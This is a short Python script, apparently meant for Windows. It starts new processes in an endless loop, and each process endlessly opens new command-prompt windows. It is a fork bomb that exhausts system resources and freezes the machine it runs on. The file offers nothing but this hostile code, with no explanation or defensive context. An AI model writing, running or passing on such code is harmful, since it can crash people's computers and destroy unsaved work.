from multiprocessing import Process
import os
def loop():
	while True:
                os.system('start cmd')
if __name__ == "__main__":
	while True:
		obj=Process(target=loop)
		obj.start()
